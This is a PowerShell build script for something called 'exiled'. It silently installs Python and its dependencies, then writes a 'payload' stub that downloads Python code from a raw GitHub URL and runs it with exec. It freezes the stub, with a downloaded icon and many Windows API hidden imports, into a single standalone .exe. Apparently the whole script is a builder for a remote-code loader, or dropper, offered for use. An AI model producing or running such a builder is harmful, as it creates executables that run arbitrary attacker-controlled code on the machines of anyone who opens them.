[CmdletBinding()]
param(
    [string]$Out = "exiled",
    [string]$Url = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/external.py",
    [string]$Icon = "https://cdn.discordapp.com/icons/1517380157533589564/e792598236304c90d8f46d24512af29f.webp?size=1024",
    [switch]$Local,
    [switch]$NoIcon,
    [switch]$KeepBuild,
    [switch]$NoDeps
)

$ErrorActionPreference = "Stop"
$ProgressPreference    = "SilentlyContinue"

$AppName = "exiled"
$OutName = $Out
$WorkDir = Join-Path $PWD "_build"
$DistDir = Join-Path $PWD "dist"
$StubPy  = Join-Path $WorkDir "payload.py"
$IconRaw = Join-Path $WorkDir "icon.raw"
$IconIco = Join-Path $WorkDir "icon.ico"
$ExePath = Join-Path $DistDir "$OutName.exe"

function Log  { param([string]$M, [string]$C = "Cyan"); Write-Host "[$AppName] $M" -ForegroundColor $C }
function Fail { param([string]$M); Write-Host "[$AppName] ERROR: $M" -ForegroundColor Red; exit 1 }
function Get-Arch { if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" } }

function Test-Python {
    param([string]$Exe)
    if (-not $Exe -or -not (Test-Path -LiteralPath $Exe)) { return $false }
    & $Exe -c "import sys" 2>$null
    return ($LASTEXITCODE -eq 0)
}

function Find-Python {
    $c = @()
    foreach ($n in @("python","py","python3")) {
        $cmd = Get-Command $n -ErrorAction SilentlyContinue
        if ($cmd -and $cmd.Source) { $c += $cmd.Source }
    }
    foreach ($r in @(
        "$env:LocalAppData\Programs\Python\Python*",
        "$env:ProgramFiles\Python*",
        "${env:ProgramFiles(x86)}\Python*"
    )) {
        Get-ChildItem -Path $r -Filter "python.exe" -ErrorAction SilentlyContinue |
            ForEach-Object { $c += $_.FullName }
    }
    foreach ($x in ($c | Select-Object -Unique)) {
        if (Test-Python -Exe $x) { return $x }
    }
    return $null
}

function Install-Python {
    Log "python not found — attempting winget install" "Yellow"
    $wg = Get-Command winget -ErrorAction SilentlyContinue
    if (-not $wg) { return $false }
    & winget install --id Python.Python.3.12 --scope user --silent `
        --accept-package-agreements --accept-source-agreements 2>$null
    return ($LASTEXITCODE -eq 0)
}

function Install-Packages {
    param([string]$Exe, [string[]]$Pkgs)
    Log "installing deps: $($Pkgs -join ', ')"
    & $Exe -m pip install --quiet --disable-pip-version-check --upgrade pip
    & $Exe -m pip install --quiet --disable-pip-version-check @Pkgs
    if ($LASTEXITCODE -ne 0) { Fail "pip install failed" }
}

function Fetch-File {
    param([string]$Url, [string]$Dest)
    $curl = Get-Command curl.exe -ErrorAction SilentlyContinue
    if ($curl) {
        & curl.exe -fsSL -A "Mozilla/5.0" $Url -o $Dest
    } else {
        Invoke-WebRequest -Uri $Url -OutFile $Dest -UseBasicParsing -Headers @{ "User-Agent" = "Mozilla/5.0" }
    }
    if (-not (Test-Path -LiteralPath $Dest)) { Fail "fetch failed: $Url" }
}

function Pause-Brief { param([int]$Ms = 90); Start-Sleep -Milliseconds $Ms }

Write-Host ""
Write-Host "  ╔════════════════════════════════════════╗" -ForegroundColor DarkCyan
Write-Host "  ║   exiled  ·  build  ·  $(Get-Arch)         ║" -ForegroundColor DarkCyan
Write-Host "  ╚════════════════════════════════════════╝" -ForegroundColor DarkCyan
Write-Host ""

Log "python  →  locating..."
$PythonExe = Find-Python
if (-not $PythonExe) {
    Install-Python | Out-Null
    $PythonExe = Find-Python
}
if (-not $PythonExe) { Fail "python not found. install python 3.11+ or pass a known path." }
& $PythonExe -c "import tkinter" 2>$null
if ($LASTEXITCODE -ne 0) { Fail "python missing tkinter. reinstall with tcl/tk." }
Log "python  →  $PythonExe" "Green"
Pause-Brief

if (-not $NoDeps) {
    Install-Packages -Exe $PythonExe -Pkgs @("pyinstaller","pillow","pywin32","psutil","requests")
    Log "deps    →  ready" "Green"
    Pause-Brief
}

New-Item -ItemType Directory -Force -Path $WorkDir | Out-Null
New-Item -ItemType Directory -Force -Path $DistDir | Out-Null

if ($Local) {
    if (-not (Test-Path -LiteralPath $Url)) { Fail "payload missing: $Url" }
    Copy-Item -LiteralPath $Url -Destination $StubPy -Force
    Log "payload →  $Url (local)" "Green"
} else {
    Log "payload →  writing stub"
    $body = @"
import urllib.request
import tkinter
import tkinter.ttk
import tkinter.messagebox
import tkinter.filedialog
import tkinter.simpledialog
import tkinter.scrolledtext
import tkinter.font
import tkinter.colorchooser
exec(compile(urllib.request.urlopen('$Url').read(), '<url>', 'exec'))
"@
    Set-Content -Path $StubPy -Value $body -Encoding UTF8
    Log "payload →  $Url (remote)" "Green"
}
Pause-Brief

$useIco = $false
if (-not $NoIcon -and $Icon) {
    try {
        if ($Icon -match '^https?://') {
            Log "icon    →  fetching"
            Fetch-File -Url $Icon -Dest $IconRaw
        } else {
            if (-not (Test-Path -LiteralPath $Icon)) { Fail "icon missing: $Icon" }
            Copy-Item -LiteralPath $Icon -Destination $IconRaw -Force
        }
        Log "icon    →  converting to .ico"
        $conv = @"
from PIL import Image
img = Image.open(r'$IconRaw')
if img.mode != 'RGBA': img = img.convert('RGBA')
img.save(r'$IconIco', format='ICO', sizes=[(256,256),(128,128),(64,64),(48,48),(32,32),(16,16)])
"@
        $convPy = Join-Path $WorkDir "_icon.py"
        Set-Content -Path $convPy -Value $conv -Encoding UTF8
        & $PythonExe $convPy
        if ($LASTEXITCODE -eq 0) {
            $useIco = $true
            Log "icon    →  ready" "Green"
        } else {
            Log "icon    →  conversion failed, building without" "Yellow"
        }
    } catch {
        Log "icon    →  $($_.Exception.Message), building without" "Yellow"
    }
}
Pause-Brief

Log "freeze  →  $OutName.exe"
$pyi = @(
    "-m","PyInstaller",
    "--onefile","--noconfirm","--clean",
    "--name", $OutName,
    "--distpath", $DistDir,
    "--workpath", (Join-Path $WorkDir "pyi"),
    "--specpath", $WorkDir,
    "--collect-all","tkinter",
    "--collect-all","PIL",
    "--collect-submodules","win32com",
    "--hidden-import","win32api",
    "--hidden-import","win32con",
    "--hidden-import","win32file",
    "--hidden-import","win32process",
    "--hidden-import","win32security",
    "--hidden-import","win32event",
    "--hidden-import","win32service",
    "--hidden-import","win32serviceutil",
    "--hidden-import","win32timezone",
    "--hidden-import","pythoncom",
    "--hidden-import","pywintypes",
    "--hidden-import","psutil",
    "--hidden-import","requests"
)
if ($useIco) { $pyi += @("--icon", $IconIco) }
$pyi += $StubPy

& $PythonExe @pyi
if ($LASTEXITCODE -ne 0) { Fail "pyinstaller failed" }

if (-not $KeepBuild) {
    Remove-Item -Recurse -Force $WorkDir -ErrorAction SilentlyContinue
}

if (Test-Path -LiteralPath $ExePath) {
    $sz = [math]::Round((Get-Item $ExePath).Length / 1MB, 2)
    Write-Host ""
    Write-Host "  ╔════════════════════════════════════════╗" -ForegroundColor Green
    Write-Host "  ║   done   $OutName.exe  ·  $sz MB       ║" -ForegroundColor Green
    Write-Host "  ╚════════════════════════════════════════╝" -ForegroundColor Green
    Write-Host ""
    Write-Host "  path: $ExePath" -ForegroundColor DarkGray
    Write-Host ""
} else {
    Fail "exe not produced"
}
